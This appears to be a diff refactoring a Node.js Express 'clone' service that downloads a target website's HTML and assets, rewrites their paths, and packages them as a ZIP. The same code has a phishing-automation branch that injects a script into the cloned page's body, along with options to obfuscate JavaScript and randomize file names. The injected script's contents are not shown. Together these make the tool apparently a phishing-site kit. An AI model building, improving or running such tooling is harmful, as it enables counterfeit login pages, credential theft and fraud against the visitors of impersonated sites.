@@ -1,4 +1,3 @@
-
 const express = require('express');
 const axios = require('axios');
 const cheerio = require('cheerio');
@@ -104,15 +103,16 @@ async function fetchResource(url, baseUrl) {
 }
 
 // ============================================
-// CSS内のリソース抽出
+// CSS内のリソース抽出（Cheerio不要・文字列処理）
 // ============================================
-async function extractCSSResources(cssCode, cssUrl, config, resources, resourceMap, resourceCount, maxResources) {
+async function extractCSSResources(cssCode, cssUrl, config, resources, resourceMap) {
     const urlRegex = /url\(['"]?([^'")]+)['"]?\)/g;
     let match;
     let updatedCSS = cssCode;
     
     while ((match = urlRegex.exec(cssCode)) !== null) {
-        if (resourceCount >= maxResources) break;
+        const maxResources = (config.clone && config.clone.maxResources) || 500;
+        if (Object.keys(resources).length >= maxResources) break;
         
         const assetUrl = match[1];
         
@@ -124,39 +124,38 @@ async function extractCSSResources(cssCode, cssUrl, config, resources, resourceM
         const content = await fetchResource(fullAssetUrl, cssUrl);
         if (content && content.data) {
             const ext = getExtension(fullAssetUrl, content.contentType);
-            const filename = config.output && config.output.randomizeNames ? randomName(ext) : path.basename(new URL(fullAssetUrl).pathname) || randomName(ext);
+            const filename = config.output && config.output.randomizeNames 
+                ? randomName(ext) 
+                : path.basename(new URL(fullAssetUrl).pathname) || randomName(ext);
             
             resources[filename] = content.data;
             resourceMap[fullAssetUrl] = filename;
             resourceMap[assetUrl] = filename;
             
             updatedCSS = updatedCSS.split(assetUrl).join(filename);
-            
-            resourceCount++;
         }
     }
     
-    return { updatedCSS, resourceCount };
+    return updatedCSS;
 }
 
 // ============================================
-// HTML内のリソース抽出
+// HTML内のリソース抽出（CheerioのDOM操作で正確に）
 // ============================================
-async function extractHTMLResources($, html, url, config, resources, resourceMap, resourceCount, maxResources) {
-    // CSS (link)
+async function extractHTMLResources($, html, url, config, resources, resourceMap) {
+    const maxResources = (config.clone && config.clone.maxResources) || 500;
+    
+    // CSS (link rel="stylesheet")
     if (!config.clone || config.clone.css !== false) {
-        const cssLinks = [];
-        $('link[rel="stylesheet"]').each((i, el) => {
-            const href = $(el).attr('href');
-            if (href && !href.startsWith('data:')) {
-                cssLinks.push(href);
-            }
-        });
+        const cssElements = $('link[rel="stylesheet"]').toArray();
         
-        for (const cssUrl of cssLinks) {
-            if (resourceCount >= maxResources) break;
+        for (const el of cssElements) {
+            if (Object.keys(resources).length >= maxResources) break;
             
-            const fullCssUrl = resolveURL(cssUrl, url);
+            const href = $(el).attr('href');
+            if (!href || href.startsWith('data:')) continue;
+            
+            const fullCssUrl = resolveURL(href, url);
             if (!fullCssUrl) continue;
             
             console.log(`Fetching CSS: ${fullCssUrl}`);
@@ -165,41 +164,37 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
             if (content && content.data) {
                 let cssCode = Buffer.from(content.data).toString('utf8');
                 
-                console.log(`CSS size: ${cssCode.length} bytes`);
-                
-                const result = await extractCSSResources(cssCode, fullCssUrl, config, resources, resourceMap, resourceCount, maxResources);
-                cssCode = result.updatedCSS;
-                resourceCount = result.resourceCount;
+                cssCode = await extractCSSResources(cssCode, fullCssUrl, config, resources, resourceMap);
                 
                 if (config.output && config.output.minify) {
                     cssCode = minifyCSS(cssCode);
                 }
                 
-                const filename = config.output && config.output.randomizeNames ? randomName('css') : path.basename(new URL(fullCssUrl).pathname) || randomName('css');
+                const filename = config.output && config.output.randomizeNames 
+                    ? randomName('css') 
+                    : path.basename(new URL(fullCssUrl).pathname) || randomName('css');
+                
                 resources[filename] = Buffer.from(cssCode);
-                resourceMap[cssUrl] = filename;
-                resourceMap[fullCssUrl] = filename;
-                resourceCount++;
+                
+                // Cheerioで直接href属性を書き換え
+                $(el).attr('href', filename);
                 
                 console.log(`Added CSS: ${filename} (${cssCode.length} bytes)`);
             }
         }
     }
     
-    // JavaScript
+    // JavaScript (script src)
     if (!config.clone || config.clone.js !== false) {
-        const jsFiles = [];
-        $('script[src]').each((i, el) => {
-            const src = $(el).attr('src');
-            if (src && !src.startsWith('data:')) {
-                jsFiles.push(src);
-            }
-        });
+        const jsElements = $('script[src]').toArray();
         
-        for (const jsUrl of jsFiles) {
-            if (resourceCount >= maxResources) break;
+        for (const el of jsElements) {
+            if (Object.keys(resources).length >= maxResources) break;
             
-            const fullJsUrl = resolveURL(jsUrl, url);
+            const src = $(el).attr('src');
+            if (!src || src.startsWith('data:')) continue;
+            
+            const fullJsUrl = resolveURL(src, url);
             if (!fullJsUrl) continue;
             
             console.log(`Fetching JS: ${fullJsUrl}`);
@@ -208,70 +203,37 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
             if (content && content.data) {
                 let jsCode = Buffer.from(content.data).toString('utf8');
                 
-                console.log(`JS size: ${jsCode.length} bytes`);
-                
                 if (config.output && config.output.obfuscate) {
                     jsCode = obfuscateJS(jsCode);
                 } else if (config.output && config.output.minify) {
                     jsCode = minifyJS(jsCode);
                 }
                 
-                const filename = config.output && config.output.randomizeNames ? randomName('js') : path.basename(new URL(fullJsUrl).pathname) || randomName('js');
+                const filename = config.output && config.output.randomizeNames 
+                    ? randomName('js') 
+                    : path.basename(new URL(fullJsUrl).pathname) || randomName('js');
+                
                 resources[filename] = Buffer.from(jsCode);
-                resourceMap[jsUrl] = filename;
-                resourceMap[fullJsUrl] = filename;
-                resourceCount++;
+                
+                // Cheerioで直接src属性を書き換え
+                $(el).attr('src', filename);
                 
                 console.log(`Added JS: ${filename} (${jsCode.length} bytes)`);
             }
         }
     }
     
-    // 画像
+    // 画像 (img src)
     if (!config.clone || config.clone.images !== false) {
-        const images = [];
+        const imgElements = $('img[src]').toArray();
         
-        $('img').each((i, el) => {
-            const src = $(el).attr('src');
-            if (src && !src.startsWith('data:')) {
-                images.push(src);
-            }
-        });
-        
-        $('img[srcset]').each((i, el) => {
-            const srcset = $(el).attr('srcset');
-            if (srcset) {
-                const srcsetUrls = srcset.split(',').map(s => s.trim().split(' ')[0]);
-                srcsetUrls.forEach(src => {
-                    if (src && !src.startsWith('data:')) {
-                        images.push(src);
-                    }
-                });
-            }
-        });
-        
-        $('[style*="background"]').each((i, el) => {
-            const style = $(el).attr('style') || '';
-            const bgRegex = /background(?:-image)?\s*:\s*url\(['"]?([^'")]+)['"]?\)/g;
-            let match;
-            while ((match = bgRegex.exec(style)) !== null) {
-                if (match[1] && !match[1].startsWith('data:')) {
-                    images.push(match[1]);
-                }
-            }
-        });
-        
-        $('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]').each((i, el) => {
-            const href = $(el).attr('href');
-            if (href && !href.startsWith('data:')) {
-                images.push(href);
-            }
-        });
-        
-        for (const imgUrl of images) {
-            if (resourceCount >= maxResources) break;
+        for (const el of imgElements) {
+            if (Object.keys(resources).length >= maxResources) break;
             
-            const fullImgUrl = resolveURL(imgUrl, url);
+            const src = $(el).attr('src');
+            if (!src || src.startsWith('data:')) continue;
+            
+            const fullImgUrl = resolveURL(src, url);
             if (!fullImgUrl) continue;
             
             console.log(`Fetching image: ${fullImgUrl}`);
@@ -279,89 +241,172 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
             const content = await fetchResource(fullImgUrl, url);
             if (content && content.data) {
                 const ext = getExtension(fullImgUrl, content.contentType);
-                const filename = config.output && config.output.randomizeNames ? randomName(ext) : path.basename(new URL(fullImgUrl).pathname) || randomName(ext);
+                const filename = config.output && config.output.randomizeNames 
+                    ? randomName(ext) 
+                    : path.basename(new URL(fullImgUrl).pathname) || randomName(ext);
                 
                 resources[filename] = content.data;
-                resourceMap[imgUrl] = filename;
-                resourceMap[fullImgUrl] = filename;
-                resourceCount++;
+                
+                // Cheerioで直接src属性を書き換え
+                $(el).attr('src', filename);
                 
                 console.log(`Added image: ${filename} (${Buffer.byteLength(content.data)} bytes)`);
+            }
+        }
+        
+        // srcset対応
+        const srcsetElements = $('img[srcset]').toArray();
+        
+        for (const el of srcsetElements) {
+            if (Object.keys(resources).length >= maxResources) break;
+            
+            const srcset = $(el).attr('srcset');
+            if (!srcset) continue;
+            
+            const srcsetUrls = srcset.split(',').map(s => s.trim().split(' ')[0]).filter(Boolean);
+            
+            for (const srcsetUrl of srcsetUrls) {
+                if (Object.keys(resources).length >= maxResources) break;
+                if (!srcsetUrl || srcsetUrl.startsWith('data:')) continue;
+                
+                const fullImgUrl = resolveURL(srcsetUrl, url);
+                if (!fullImgUrl) continue;
+                
+                const content = await fetchResource(fullImgUrl, url);
+                if (content && content.data) {
+                    const ext = getExtension(fullImgUrl, content.contentType);
+                    const filename = config.output && config.output.randomizeNames 
+                        ? randomName(ext) 
+                        : path.basename(new URL(fullImgUrl).pathname) || randomName(ext);
+                    
+                    resources[filename] = content.data;
+                    
+                    // srcset内のURLを置換
+                    const newSrcset = srcset.split(srcsetUrl).join(filename);
+                    $(el).attr('srcset', newSrcset);
+                }
+            }
+        }
+        
+        // 背景画像 (style属性内)
+        const bgElements = $('[style*="background"]').toArray();
+        
+        for (const el of bgElements) {
+            if (Object.keys(resources).length >= maxResources) break;
+            
+            const style = $(el).attr('style') || '';
+            const bgRegex = /background(?:-image)?\s*:\s*url\(['"]?([^'")]+)['"]?\)/g;
+            let match;
+            let newStyle = style;
+            
+            while ((match = bgRegex.exec(style)) !== null) {
+                if (Object.keys(resources).length >= maxResources) break;
+                
+                const bgUrl = match[1];
+                if (!bgUrl || bgUrl.startsWith('data:')) continue;
+                
+                const fullBgUrl = resolveURL(bgUrl, url);
+                if (!fullBgUrl) continue;
+                
+                const content = await fetchResource(fullBgUrl, url);
+                if (content && content.data) {
+                    const ext = getExtension(fullBgUrl, content.contentType);
+                    const filename = config.output && config.output.randomizeNames 
+                        ? randomName(ext) 
+                        : path.basename(new URL(fullBgUrl).pathname) || randomName(ext);
+                    
+                    resources[filename] = content.data;
+                    
+                    newStyle = newStyle.split(bgUrl).join(filename);
+                    $(el).attr('style', newStyle);
+                }
+            }
+        }
+        
+        // ファビコン
+        const iconElements = $('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]').toArray();
+        
+        for (const el of iconElements) {
+            if (Object.keys(resources).length >= maxResources) break;
+            
+            const href = $(el).attr('href');
+            if (!href || href.startsWith('data:')) continue;
+            
+            const fullIconUrl = resolveURL(href, url);
+            if (!fullIconUrl) continue;
+            
+            const content = await fetchResource(fullIconUrl, url);
+            if (content && content.data) {
+                const ext = getExtension(fullIconUrl, content.contentType);
+                const filename = config.output && config.output.randomizeNames 
+                    ? randomName(ext) 
+                    : path.basename(new URL(fullIconUrl).pathname) || randomName(ext);
+                
+                resources[filename] = content.data;
+                
+                $(el).attr('href', filename);
             }
         }
     }
     
     // フォント
     if (!config.clone || config.clone.fonts !== false) {
-        const fonts = [];
+        const fontElements = $('link[rel="preload"][as="font"], link[rel="preload"][type="font/woff2"]').toArray();
         
-        $('link[rel="preload"][as="font"]').each((i, el) => {
-            const href = $(el).attr('href');
-            if (href) fonts.push(href);
-        });
-        
-        $('link[rel="preload"][type="font/woff2"]').each((i, el) => {
-            const href = $(el).attr('href');
-            if (href) fonts.push(href);
-        });
-        
-        for (const fontUrl of fonts) {
-            if (resourceCount >= maxResources) break;
+        for (const el of fontElements) {
+            if (Object.keys(resources).length >= maxResources) break;
             
-            const fullFontUrl = resolveURL(fontUrl, url);
+            const href = $(el).attr('href');
+            if (!href || href.startsWith('data:')) continue;
+            
+            const fullFontUrl = resolveURL(href, url);
             if (!fullFontUrl) continue;
             
             const content = await fetchResource(fullFontUrl, url);
             if (content && content.data) {
                 const ext = getExtension(fullFontUrl, content.contentType);
-                const filename = config.output && config.output.randomizeNames ? randomName(ext) : path.basename(new URL(fullFontUrl).pathname) || randomName(ext);
+                const filename = config.output && config.output.randomizeNames 
+                    ? randomName(ext) 
+                    : path.basename(new URL(fullFontUrl).pathname) || randomName(ext);
                 
                 resources[filename] = content.data;
-                resourceMap[fontUrl] = filename;
-                resourceMap[fullFontUrl] = filename;
-                resourceCount++;
+                
+                $(el).attr('href', filename);
             }
         }
     }
     
     // 動画・音声
     if (!config.clone || config.clone.videos !== false) {
-        const media = [];
+        const mediaElements = $('video source[src], video[src], audio source[src], audio[src]').toArray();
         
-        $('video source, video[src], audio source, audio[src]').each((i, el) => {
-            const src = $(el).attr('src');
-            if (src && !src.startsWith('data:')) {
-                media.push(src);
-            }
-        });
-        
-        for (const mediaUrl of media) {
-            if (resourceCount >= maxResources) break;
+        for (const el of mediaElements) {
+            if (Object.keys(resources).length >= maxResources) break;
             
-            const fullMediaUrl = resolveURL(mediaUrl, url);
+            const src = $(el).attr('src');
+            if (!src || src.startsWith('data:')) continue;
+            
+            const fullMediaUrl = resolveURL(src, url);
             if (!fullMediaUrl) continue;
             
             const content = await fetchResource(fullMediaUrl, url);
             if (content && content.data) {
                 const ext = getExtension(fullMediaUrl, content.contentType);
-                const filename = config.output && config.output.randomizeNames ? randomName(ext) : path.basename(new URL(fullMediaUrl).pathname) || randomName(ext);
+                const filename = config.output && config.output.randomizeNames 
+                    ? randomName(ext) 
+                    : path.basename(new URL(fullMediaUrl).pathname) || randomName(ext);
                 
                 resources[filename] = content.data;
-                resourceMap[mediaUrl] = filename;
-                resourceMap[fullMediaUrl] = filename;
-                resourceCount++;
+                
+                $(el).attr('src', filename);
             }
         }
     }
     
-    // HTML内のパス置換
-    let updatedHTML = html;
-    for (const [originalUrl, newFilename] of Object.entries(resourceMap)) {
-        const escapedUrl = originalUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-        updatedHTML = updatedHTML.split(originalUrl).join(newFilename);
-    }
+    // HTML全体を更新（Cheerioで書き換えた内容を反映）
+    const updatedHTML = $.html();
     
-    return { updatedHTML, resourceCount };
+    return updatedHTML;
 }
 
 // ============================================
@@ -380,22 +425,18 @@ async function cloneSiteDeep(url, config) {
         }
     });
     
-    let html = response.data;
+    const html = response.data;
     console.log(`HTML size: ${html.length} bytes`);
     
     const $ = cheerio.load(html);
     const resources = {};
     const resourceMap = {};
-    let resourceCount = 0;
     
-    const maxResources = (config.clone && config.clone.maxResources) || 500;
+    const updatedHTML = await extractHTMLResources($, html, url, config, resources, resourceMap);
     
-    const result = await extractHTMLResources($, html, url, config, resources, resourceMap, resourceCount, maxResources);
-    html = result.updatedHTML;
-    resourceCount = result.resourceCount;
+    let finalHTML = updatedHTML;
     
-    console.log(`Total resources: ${resourceCount}`);
-    console.log(`Resource keys: ${Object.keys(resources).join(', ')}`);
+    console.log(`Total resources: ${Object.keys(resources).length}`);
     
     // フィッシング自動化
     if (config.phishing && config.phishing.enabled) {
@@ -452,12 +493,12 @@ async function cloneSiteDeep(url, config) {
         }
         
         phishingScript += '</script>';
-        html = html.replace('</body>', phishingScript + '</body>');
+        finalHTML = finalHTML.replace('</body>', phishingScript + '</body>');
     }
     
     // HTML minify
     if (config.output && config.output.minify) {
-        html = await minifyHTML(html, {
+        finalHTML = await minifyHTML(finalHTML, {
             collapseWhitespace: true,
             removeComments: true,
             removeRedundantAttributes: true,
@@ -466,7 +507,7 @@ async function cloneSiteDeep(url, config) {
         });
     }
     
-    resources['index.html'] = Buffer.from(html);
+    resources['index.html'] = Buffer.from(finalHTML);
     
     return resources;
 }
@@ -498,11 +539,15 @@ app.post('/clone', async (req, res) => {
         
         archive.pipe(res);
         
-        Object.entries(resources).forEach(([filename, content]) => {
+        // site-name/ ディレクトリを作成してからファイルを追加
+        const siteDir = `${siteName}/`;
+        archive.append(null, { name: siteDir, type: 'directory' });
+        
+        for (const [filename, content] of Object.entries(resources)) {
             const buffer = Buffer.isBuffer(content) ? content : Buffer.from(content);
             console.log(`ZIP: ${siteName}/${filename} (${buffer.length} bytes)`);
             archive.append(buffer, { name: `${siteName}/${filename}` });
-        });
+        }
         
         archive.finalize();
         
